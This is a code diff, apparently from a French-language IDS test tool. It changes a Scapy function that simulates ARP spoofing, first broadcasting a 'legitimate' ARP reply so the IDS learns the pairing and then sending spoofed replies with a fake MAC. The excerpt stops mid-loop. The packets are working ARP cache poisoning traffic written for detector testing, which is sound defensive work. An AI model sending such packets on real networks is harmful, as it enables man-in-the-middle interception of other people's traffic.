@@ -77,12 +77,23 @@ def simuler_arp_spoofing(ip_cible, interface):
     C'est la base de l'attaque Man-in-the-Middle (MITM).
     """
     FAUSSE_MAC = "02:11:22:33:44:55"
+    VRAIE_MAC = "00:11:22:33:44:55" # Simule la vraie adresse MAC
     
     print(f"\n{'-' * 50}")
     print(f"  [ARP] Simulation ARP SPOOFING")
-    print(f"  Cible : {ip_cible} -> fausse MAC {FAUSSE_MAC}")
+    print(f"  Cible : {ip_cible}")
     print(f"{'-' * 50}")
     
+    # 1. Envoyer une annonce ARP "Légitime" pour que l'IDS apprenne l'IP
+    print("  > Envoi d'une annonce ARP legitime pour initialiser l'IDS...")
+    paquet_legitime = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+        op=2, psrc=ip_cible, hwsrc=VRAIE_MAC, pdst=ip_cible, hwdst="ff:ff:ff:ff:ff:ff"
+    )
+    sendp(paquet_legitime, iface=interface, verbose=False)
+    time.sleep(2)
+    
+    print(f"  > Changement de MAC (Spoofing) vers {FAUSSE_MAC} !")
+    # 2. Envoyer les annonces ARP "Spoofées"
     for i in range(5):
         paquet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
             op=2,               # op=2 → ARP Reply
